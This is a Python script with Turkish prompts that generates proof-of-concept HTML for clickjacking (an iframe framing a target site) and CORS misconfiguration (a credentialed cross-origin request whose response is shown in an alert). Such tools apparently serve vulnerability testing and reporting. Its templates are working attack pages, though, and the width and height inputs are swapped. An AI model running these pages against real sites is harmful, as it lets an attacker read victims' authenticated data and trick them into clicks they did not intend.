#! /usr/bin/env python
print("""
C4N POC GENERATOR | CORS -CLICKJACKING
     #telegram: c4nnn"
""")

# Colors
HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'


input1= int(input(OKBLUE+"""
1-ClickJacking Poc Generator
2-CORS Poc Generator
Hangisini seçmek istersiniz ? 
"""))

if(input1==1):
    print (OKBLUE+"Clickjacking | c4n")
    input2= input("hedef site giriniz: ")
    height = input("Bir genişlik giriniz: ")
    widht = input("Bir uzunluk giriniz: ")
    print (OKGREEN+"[+] POC Başarıyla oluşturuldu. ")

    poc = ("""
    <html>
    <!-- POC GENERATOR BY C4N -->
    <title>PoC generator</title>
  <iframe src="{}"  width="{}" height="{}"/>
    </html>
    """).format(input2,height,widht)
    dosya = open("clickjacking.html", "w")
    dosya.write(poc)

elif(input1==2):
    print(OKBLUE+"CORS | c4n")
    input2 = input("hedef site giriniz: ")
    print('%s' % (input2))
    poc = ("""
<html>
     <body>
         <h2>CORS Poc Generator</h2>
         <h3>Coded By C4N </h3>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "%s", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
     """% (input2))
    dosya = open("cors.html", "w")
    dosya.write(poc)
    print (BOLD+"[+] POC Başarıyla oluşturuldu. ")
else:
    print("Lütfen 1 veya 2 yazınız.")

